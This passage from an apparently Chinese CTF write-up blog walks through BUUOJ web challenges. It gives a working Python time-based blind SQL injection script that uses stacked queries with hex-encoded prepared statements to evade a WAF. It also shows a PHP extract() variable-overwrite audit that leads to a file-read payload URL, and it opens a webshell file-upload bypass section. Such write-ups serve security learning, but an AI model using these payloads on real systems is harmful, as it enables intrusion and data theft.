src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201004211403.png" alt="image-20201004210409621"></p> <p>这样一来，拼接到服务器端的SQL语句就是：</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> {table_name} <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'123'</span><span class="token punctuation">;</span><span class="token string">' and password='</span><span class="token number">123</span>'
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>因为<code>;</code>号表示一个SQL语句的结束，<code>;</code>号后面的一个<code>'</code>号被认为是下一个SQL语句的开始，所以没有产生报错，也就是说，这个题目是存在堆叠注入的（<code>;</code>号被解析了）。</p> <p>题目没有回显，所以可以尝试使用时间盲注 + 堆叠注入来进行注入，下面是简单的演示：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201004211142.png" alt="image-20201004211142245"></p> <p>另外可以把SQL语句进行hex转换来绕过WAF（在MySQL中0x开头的十六进制数会被转换成字符串），下面贴上我的脚本：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> json


<span class="token keyword">def</span> <span class="token function">str_to_hex</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> s<span class="token punctuation">]</span><span class="token punctuation">)</span>


url <span class="token operator">=</span> <span class="token string">'http://14404d01-74ee-411a-b1c3-bc37abb07bd1.node3.buuoj.cn/index.php?r=Login/Login'</span>
flag <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment"># temp_payload = 'select if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))&gt;{}),1,sleep(3))'.format(str(i), str(j))</span>
        <span class="token comment"># table: flag</span>
        <span class="token comment"># temp_payload = &quot;select if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flag'),{},1))&gt;{}),1,sleep(3))&quot;.format(str(i), str(j))</span>
        <span class="token comment"># cloumn: flag</span>
        temp_payload <span class="token operator">=</span> <span class="token string">&quot;select if((ascii(substr((select group_concat(flag) from flag),{},1))&gt;{}),1,sleep(3))&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>
        payload <span class="token operator">=</span> <span class="token string">&quot;1';set @a=0x&quot;</span> <span class="token operator">+</span> str_to_hex<span class="token punctuation">(</span>temp_payload<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&quot;;prepare inj from @a;execute inj -- &quot;</span>
        data <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;username&quot;</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span>
            <span class="token string">&quot;password&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;123456&quot;</span>
        <span class="token punctuation">}</span>
        data <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span>seconds<span class="token punctuation">)</span>
        <span class="token keyword">if</span> res<span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span>seconds <span class="token operator">&gt;</span> <span class="token number">2</span><span class="token punctuation">:</span>
            flag <span class="token operator">=</span> flag <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br></div></div><p>最后得到了如下结果：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201004211336.png" alt="image-20201004211336213"></p> <p>拿到源码</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201004211549.png" alt="image-20201004211549551"></p> <p>是一个简单的MVC框架，<code>fun.php</code>中对传入的<code>r</code>参数进行了相应的处理：</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token comment">// 路由控制跳转至控制器</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token variable">$r</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$controller</span><span class="token punctuation">,</span><span class="token variable">$action</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token variable">$r</span><span class="token punctuation">;</span>
	<span class="token variable">$controller</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$controller</span><span class="token punctuation">}</span></span>Controller&quot;</span><span class="token punctuation">;</span>
	<span class="token variable">$action</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;action<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$action</span><span class="token punctuation">}</span></span>&quot;</span><span class="token punctuation">;</span>


	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">class_exists</span><span class="token punctuation">(</span><span class="token variable">$controller</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">method_exists</span><span class="token punctuation">(</span><span class="token variable">$controller</span><span class="token punctuation">,</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token punctuation">{</span>
			<span class="token comment">//</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">else</span>
		<span class="token punctuation">{</span>
			<span class="token variable">$action</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;actionIndex&quot;</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">else</span>
	<span class="token punctuation">{</span>
		<span class="token variable">$controller</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;LoginController&quot;</span><span class="token punctuation">;</span>
        <span class="token variable">$action</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;actionIndex&quot;</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token variable">$controller</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Location:index.php?r=Login/Index&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br></div></div><p>审计的过程我就不详细说了，就简单说一下关键的地方：在<code>BaseController.php</code>中会接受两个参数，其中会对<code>viewData</code>进行<code>extract</code>处理，这里是会造成变量覆盖的。</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code># BaseController.php

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 

<span class="token comment">/**
* 所有控制器的父类
*/</span>
<span class="token keyword">class</span> <span class="token class-name">BaseController</span>
<span class="token punctuation">{</span>
	<span class="token comment">/*
	 * 加载视图文件
	 * viewName 视图名称
	 * viewData 视图分配数据
	*/</span>
	<span class="token keyword">private</span> <span class="token variable">$viewPath</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">loadView</span><span class="token punctuation">(</span><span class="token variable">$viewName</span> <span class="token operator">=</span><span class="token single-quoted-string string">''</span><span class="token punctuation">,</span> <span class="token variable">$viewData</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">viewPath</span> <span class="token operator">=</span> <span class="token constant">BASE_PATH</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">&quot;/View/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$viewName</span><span class="token punctuation">}</span></span>.php&quot;</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">viewPath</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token punctuation">{</span>
			<span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$viewData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">include</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">viewPath</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
	
<span class="token punctuation">}</span>
</span></code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br></div></div><p>接着逆向追踪调<code>loadView</code>的地方：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201004214232.png" alt="image-20201004212235209"></p> <p>在<code>LoginController</code>这个控制器中传入<code>loadView</code>方法中的参数都是写死了的，所以暂且不是我们要审计的重点，同时可以看到，在<code>UserController</code>这个控制器中同样调用了该方法，同时用一个变量作为<code>loadView</code>方法的第二个参数，结合之前我们所提到的变量覆盖，所以可以跟进该控制器，进一步进行审计：</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code># UserController.php

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 

<span class="token comment">/**
* 用户控制器
*/</span>
<span class="token keyword">class</span> <span class="token class-name">UserController</span> <span class="token keyword">extends</span> <span class="token class-name">BaseController</span>
<span class="token punctuation">{</span>
	<span class="token comment">// 访问列表</span>
	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">actionList</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token variable">$params</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">;</span>
		<span class="token variable">$userModel</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UserModel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$listData</span> <span class="token operator">=</span> <span class="token variable">$userModel</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">getPageList</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">loadView</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'userList'</span><span class="token punctuation">,</span> <span class="token variable">$listData</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">actionIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$listData</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">loadView</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'userIndex'</span><span class="token punctuation">,</span><span class="token variable">$listData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</span></code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br></div></div><p>在第二个方法<code>actionIndex</code>中把<code>$_REQUEST</code>这个数组赋值给了<code>$listData</code>，然后传入了<code>loadView</code>方法，也就是说我们可以控制该方法的第二个参数进行变量覆盖。传入该方法的第一个参数是<code>userIndex</code>，我们再跟进<code>viewIndex</code>方法进行后续的审计。</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">loadView</span><span class="token punctuation">(</span><span class="token variable">$viewName</span> <span class="token operator">=</span><span class="token single-quoted-string string">''</span><span class="token punctuation">,</span> <span class="token variable">$viewData</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">viewPath</span> <span class="token operator">=</span> <span class="token constant">BASE_PATH</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">&quot;/View/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$viewName</span><span class="token punctuation">}</span></span>.php&quot;</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">viewPath</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token punctuation">{</span>
			<span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$viewData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">include</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">viewPath</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>该方法会将第一个参数进行一下路径的拼接得到一个php文件，然后直接包含该文件，因为传入<code>loadView</code>方法的第一个参数是<code>userIndex</code>，所以我们跟进<code>userIndex.php</code>：</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>container<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>row<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>col-sm-4<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">&gt;</span></span>关于我<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h5</span><span class="token punctuation">&gt;</span></span>我的照片:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h5</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>fakeimg<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$img_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token variable">$img_file</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/../favicon.ico'</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token variable">$img_dir</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token variable">$img_file</span><span class="token punctuation">;</span>
                <span class="token variable">$img_base64</span> <span class="token operator">=</span> <span class="token function">imgToBase64</span><span class="token punctuation">(</span><span class="token variable">$img_dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;img src=&quot;'</span> <span class="token punctuation">.</span> <span class="token variable">$img_base64</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'&quot;&gt;'</span><span class="token punctuation">;</span>       <span class="token comment">//图片形式展示</span>
                <span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
                    
······
                    
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function">imgToBase64</span><span class="token punctuation">(</span><span class="token variable">$img_file</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

    <span class="token variable">$img_base64</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$img_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$app_img_file</span> <span class="token operator">=</span> <span class="token variable">$img_file</span><span class="token punctuation">;</span> <span class="token comment">// 图片路径</span>
        <span class="token variable">$img_info</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$app_img_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 取得图片的大小，类型等</span>

        <span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$app_img_file</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">&quot;r&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 图片是否可读权限</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$filesize</span> <span class="token operator">=</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$app_img_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token variable">$filesize</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$file_content</span> <span class="token operator">=</span> <span class="token function">chunk_split</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// base64编码</span>
            <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$img_info</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>           <span class="token comment">//判读图片类型</span>
                <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token variable">$img_type</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;gif&quot;</span><span class="token punctuation">;</span>
                    <span class="token keyword">break</span><span class="token punctuation">;</span>
                <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span> <span class="token variable">$img_type</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;jpg&quot;</span><span class="token punctuation">;</span>
                    <span class="token keyword">break</span><span class="token punctuation">;</span>
                <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span> <span class="token variable">$img_type</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;png&quot;</span><span class="token punctuation">;</span>
                    <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token variable">$img_base64</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'data:image/'</span> <span class="token punctuation">.</span> <span class="token variable">$img_type</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">';base64,'</span> <span class="token punctuation">.</span> <span class="token variable">$file_content</span><span class="token punctuation">;</span><span class="token comment">//合成图片的base64编码</span>

        <span class="token punctuation">}</span>
        <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> <span class="token variable">$img_base64</span><span class="token punctuation">;</span> <span class="token comment">//返回图片的base64</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br></div></div><p><code>$img_file</code>是我们通过变量覆盖可以随意更改的，然后会将该变量所对应的文件内容进行b64编码处理，那么思路就是：<strong>访问对应的控制器，通过变量覆盖修改<code>$img_file</code>为<code>flag.php</code>，得到flag。</strong></p> <p>我们需要的控制器是<code>UserController</code>，要使用的方法是该控制器下的<code>actionIndex</code>，所以需要修改f参数为<code>User/Index</code>，同时传入<code>img_file</code>参数进行变量覆盖：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>http://322ce0e8-adc4-4718-819d-553aa6899ac5.node3.buuoj.cn/index.php?r=User/Index&amp;img_file=/../flag.php
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201004213838.png" alt="image-20201004213838374"></p> <p>解码一下，拿到flag：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201004213921.png" alt="image-20201004213921250"></p> <div class="custom-block warning"><p class="custom-block-title">注意</p> <p>这里要注意路径的问题，因为在actionIndex中已经把路径定义到了userIndex.php，所以要访问flag.php还需要跳回上一层目录，且由于定义的路径没有用/结尾，所以还需要加一个/号，于是得到最后的payload是img_file=/../flag.php</p></div> <h2 id="文件上传"><a href="#文件上传" class="header-anchor">#</a> 文件上传</h2> <h3 id="cv-maker"><a href="#cv-maker" class="header-anchor">#</a> CV Maker</h3> <p>**考点：<em>exif_imagetype()<em>的绕过</em></em></p> <p>这个函数的绕过在我以前一篇文章中写到过：<a href="https://f4de.ink/2020/06/10/SUCTF-2019-EasyWeb/" target="_blank" rel="noopener noreferrer">这里<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p>题目除了注册登录其他点其他地方都没啥反应，那就随便注册一个账号登录进去，只有一个上传头像的功能。</p> <p>上传普通一句话木马文件会回显这样的东西：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200715162315.png" alt="20200330145540890"></p> 